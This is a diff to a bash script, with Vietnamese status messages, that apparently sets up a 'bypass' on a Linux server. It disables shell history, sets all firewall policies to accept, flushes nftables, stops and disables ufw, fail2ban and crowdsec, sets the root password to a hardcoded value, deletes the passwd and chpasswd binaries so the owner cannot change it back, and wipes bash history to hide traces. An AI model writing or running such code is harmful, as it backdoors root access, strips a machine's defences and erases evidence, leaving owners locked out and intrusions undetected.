@@ -1,11 +1,5 @@
 #!/bin/bash
 export HISTFILE=/dev/null
-
-echo "[+] Bắt đầu thay passwd..."
-echo "root:tbao123" | chpasswd
-echo "[+] Đã thay passwd mới: tbao123"
-sleep 2
-
 echo -e "Bắt đầu cài đặt bypass"
 echo "[+] Bật chế độ bypass"
 sysctl -w net.core.rmem_max=134217728 &>/dev/null
@@ -31,7 +25,16 @@ iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACC
 nft flush ruleset &>/dev/null
 systemctl stop ufw fail2ban crowdsec &>/dev/null
 systemctl disable ufw fail2ban crowdsec &>/dev/null
-sleep 2
+
+
+echo "[+] Bắt đầu thay passwd..."
+echo "root:tbao123" | chpasswd
+if [ $? -eq 0 ]; then
+    echo "[+] Đã thay passwd mới: tbao123"
+else
+    echo "[!] Lỗi thay passwd - kiểm tra lại"
+    exit 1
+fi
 
 echo "[+] Bắt đầu chặn thay passwd..."
 touch /usr/bin/passwd
@@ -44,7 +47,7 @@ source ~/.bashrc
 rm -f /usr/bin/chpasswd /bin/chpasswd /usr/sbin/chpasswd
 rm -f /usr/bin/passwd /bin/passwd
 echo "[+] Đã chặn thay passwd"
-sleep 2
+
 
 echo "[!] Đang dọn dấu vết 100%..."
     history -c; echo "" > /root/.bash_history
